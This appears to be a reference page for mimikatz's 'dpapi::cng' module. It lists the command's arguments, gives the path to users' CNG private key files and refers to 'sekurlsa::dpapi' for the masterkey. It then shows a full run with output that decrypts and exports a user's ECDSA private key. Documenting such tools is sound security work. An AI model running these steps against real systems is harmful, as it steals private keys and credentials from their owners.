# cng

`dpapi::cng` decrypts a given CNG private key file. According to this [document](https://raw.githubusercontent.com/microsoft/TSS.MSR/master/PCPTool.v11/Using%20the%20Windows%208%20Platform%20Crypto%20Provider%20and%20Associated%20TPM%20Functionality.pdf), the Crypto Next Generation (CNG) API is a successor of of Crypto API (CAPI). It has the following command line argument:

* `/in`: the CNG private key file. The location of the file is `C:\Users\<UserName>\AppData\Roaming\Microsoft\Crypto\Keys\<key_file>`
* `/password`: the password to decrypt the cng
* `/masterkey`: the masterkey to use for decryption. It can be obtained through [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi).
* `/unprotect`: display the decryption results on screen

```
mimikatz # dpapi::cng /in:"C:\Users\m3g9tr0n\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_e4aad2d1-5ec0-4ea4-b259-65eda5bc47a8" /unprotect
**KEY (cng)**
  dwVersion             : 00000001 - 1
  unk                   : 00000000 - 0
  dwNameLen             : 0000006e - 110
  type                  : 00030004 - 196612
  dwPublicPropertiesLen : 00000088 - 136
  dwPrivatePropertiesLen: 000000ee - 238
  dwPrivateKeyLen       : 00000110 - 272
  unkArray[16]          : 00000000000000000000000000000000
  pName                 : Microsoft Connected Devices Platform device certificate
  pPublicProperties     : 2 field(s)
  **KEY CNG PROPERTY**
    dwStructLen     : 0000002c - 44
    type            : 00000000 - 0
    unk             : 00000000 - 0
    dwNameLen       : 00000010 - 16
    dwPropertyLen   : 00000008 - 8
    pName           : Modified
    pProperty       : 2136f8f327d6d701

  **KEY CNG PROPERTY**
    dwStructLen     : 0000005c - 92
    type            : 0000000a - 10
    unk             : 00000000 - 0
    dwNameLen       : 00000000 - 0
    dwPropertyLen   : 00000048 - 72
    pName           :
    pProperty       : 45435331200000005266cba2681ed70a0576a7f8b430eb41d1c44c4891a841726808ffa0ee887a7c8f4a06ad0916f7503124549834a58a0d7e6a22fbeab527bcd527fbc1c519f9d8

  pPrivateProperties    :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {5c22983f-77ee-41e4-9086-8073d664e417}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 0000002e - 46
    szDescription      : Private Key Properties
    algCrypt           : 00006603 - 26115 (CALG_3DES)
    dwAlgCryptLen      : 000000c0 - 192
    dwSaltLen          : 00000010 - 16
    pbSalt             : f23b7f559bbce2b8642cc8ceb007b45d
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 00008004 - 32772 (CALG_SHA1)
    dwAlgHashLen       : 000000a0 - 160
    dwHmac2KeyLen      : 00000010 - 16
    pbHmack2Key        : f06062572b447d30ce57f94d8484611f
    dwDataLen          : 00000038 - 56
    pbData             : 9ab857893f8135b87f16edbc7a885a95a58b2bd19c39ad891e463d8dffefee783d680b28d2fe37e8092515baea2ca1f5bc442095012d576d
    dwSignLen          : 00000014 - 20
    pbSign             : e93adcb7cc8f659b57ccf09ed8fe51d701d6f93d

  pPrivateKey           :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {5c22983f-77ee-41e4-9086-8073d664e417}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 00000018 - 24
    szDescription      : Private Key
    algCrypt           : 00006603 - 26115 (CALG_3DES)
    dwAlgCryptLen      : 000000c0 - 192
    dwSaltLen          : 00000010 - 16
    pbSalt             : 858b2f4b4b0ae21d72fcc27513bfaead
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 00008004 - 32772 (CALG_SHA1)
    dwAlgHashLen       : 000000a0 - 160
    dwHmac2KeyLen      : 00000010 - 16
    pbHmack2Key        : 52f468f480fc4d7e6c655d9c233103d7
    dwDataLen          : 00000070 - 112
    pbData             : f4f111a0db7097371c5a05f4fd1648bf1682e2e99d7cd7d67ab2e88ab85875073d9fec779dbefba2d0f0e3d4b60f3fd53bb7c228ea7aa087a1b54e773e2e05d5982c5e8bfb4251298011c3fc19da1a0e721c9a6fbff58e1c7a74a387f0fd4bdafd856b9563bc1070cbdf714eb78d7139
    dwSignLen          : 00000014 - 20
    pbSign             : a4864f3ddaccc3f165eab44371d06584950b9fa5

Decrypting Private Properties:
 * using CryptUnprotectData API
 * volatile cache: GUID:{5c22983f-77ee-41e4-9086-8073d664e417};KeyHash:850247e2dd89c50536c05bdcee1a56c395e752cf;Key:available
1 field(s)
**KEY CNG PROPERTY**
  dwStructLen     : 00000032 - 50
  type            : 00000003 - 3
  unk             : 00000000 - 0
  dwNameLen       : 0000001a - 26
  dwPropertyLen   : 00000004 - 4
  pName           : Export Policy
  pProperty       : 03000000

Decrypting Private Key:
 * using CryptUnprotectData API
 * volatile cache: GUID:{5c22983f-77ee-41e4-9086-8073d664e417};KeyHash:850247e2dd89c50536c05bdcee1a56c395e752cf;Key:available
45435332200000005266cba2681ed70a0576a7f8b430eb41d1c44c4891a841726808ffa0ee887a7c8f4a06ad0916f7503124549834a58a0d7e6a22fbeab527bcd527fbc1c519f9d8a6a296d94241edf1446e255551f0d9198474bd99aab67996a9a0bfc93357337d
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
        Algorithm      : ECDSA_P256
        Key size       : 256 (0x00000100)
        Export policy  : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; )
        Exportable key : YES
        LSA isolation  : NO
        Private export : OK - 'dpapi_cng_0_Microsoft Connected Devices Platform device certificate.dsa.ec.p8k'
```
